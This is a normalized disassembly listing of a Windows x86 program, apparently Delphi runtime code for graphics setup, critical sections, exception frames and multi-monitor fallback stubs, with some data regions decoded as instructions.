pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_415530
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41573c
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_41e2d8
jmp r-xdata
jmp r-xdata
call sub_41d784
sub_422b3c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_422bc9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_422a88
cmp eax [ rw-data ]
jne r-xdata
call sub_41d784
mov eax esi
call sub_422a88
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_41e81c
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402b3c
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_415774
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_422bf0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_422c7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_415510
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41573c
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41573c
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_422ca8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_41d784
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422c83
mov eax [ ebp - 0x4 ]
call sub_403128
call sub_4038dc
call sub_403930
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422ca8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_422ce8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4205c4
mov eax [ ebx + 0x28 ]
call sub_4205c8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_422d68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_422b3c
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_415774
pop esi
pop ebx
retn
sub_422db8
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_41ddd8
mov [ rw-data ] eax
pop ebx
retn
sub_422df0
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_422e34
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call sub_405fa4
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_422df0
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call sub_405fa4
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_422f00
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_422f38
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax esi
call sub_423130
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_422f7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422f64
xor eax eax
push ebp
push sub_42301d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423024
mov eax [ ebp - 0x4 ]
call sub_422f70
retn
mov eax 0x10
call sub_4026bc
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_423030
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_423030
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42310f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_421634
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_41ce64
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_41cd48
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412484
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_41d120
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_41d434
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_4212f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423130
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_422f64
xor eax eax
push ebp
push sub_42317b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423182
mov eax [ ebp - 0x4 ]
call sub_422f70
retn
mov esp ebp
pop ebp
retn
sub_423182
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403128
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_422f64
xor eax eax
push ebp
push sub_42317b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423182
mov eax [ ebp - 0x4 ]
call sub_422f70
retn
mov esp ebp
pop ebp
retn
sub_4231a8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_41c09c
push eax
mov eax ebx
call sub_41c09c
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_422f7c
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_4231e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4232a9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4232b0
retn
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
call sub_403128
call sub_4202a8
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_4048f4
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_4048f4
sub_4232b4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_422db8
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_422e34
mov cx 0x2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b854
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b854
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b854
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f00
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413acc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413acc
mov [ rw-data ] eax
mov ecx sub_41c0ac
mov edx sub_41c0bc
mov eax [ sub_41a8c4 ]
call sub_413280
mov ecx r-xdata
mov edx sub_41c2c4
mov eax [ r-xdata ]
call sub_413280
sub_4233c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4233e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4233ec
retn
sub_4233fc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
xor al 0x42
add [ eax + eax ] dl
add [ eax ] al
push eax
adc eax 0x33700041
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004234 ] bh
add [ eax ] al
add [ eax + 0x70004010 ] ah
xor eax [ eax ]
jl r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ edi + esi ] bh
inc ecx
add al ah
cmp [ ecx ] al
xor [ 0x37900042 ] 0x41
add [ eax + edi ] cl
inc ecx
add [ ebx ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
lea eax [ eax ]
adc al 0x35
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
pushad
xor al 0x42
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ 0x80042 ] dh
lodsb [ esi ]
xor al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] cl
inc edx
add [ esi + esi + 0x42 ] ch
add [ esi + esi + 0x42 ] cl
add [ eax ] bh
inc edx
add [ esi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
xor eax 0x80042
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] cl
inc edx
add [ eax ] ch
sub [ eax ] eax
dec esp
inc edx
add [ eax ] bh
inc edx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
push esp
push ebx
je r-xdata
jb r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_413ac8
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x1400408d
xor eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax edi
call sub_403128
sub_423528
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_423580
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_413ac8
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403128
sub_4235c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_423608
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_42364c
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_4137a8
mov eax esi
pop esi
pop ebx
retn
sub_423678
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42369d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4236a4
retn
sub_423774
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423799
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4237a0
retn
sub_4237ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404328
xor eax eax
push ebp
push sub_42386b
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423872
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404338
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_4237ac
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403e78
sub_423894
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_4237ac
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_42391c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_4237ac
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_4239ac
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_4237ac
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42391c
sub_423a42
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_4237ac
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_423ac3
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_4237ac
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_423bb0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_4237ac
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_423c84
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_4237ac
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_423d58
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_4237ac
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_423ef3
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_423f19
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423f20
retn
sub_423f34
push ebp
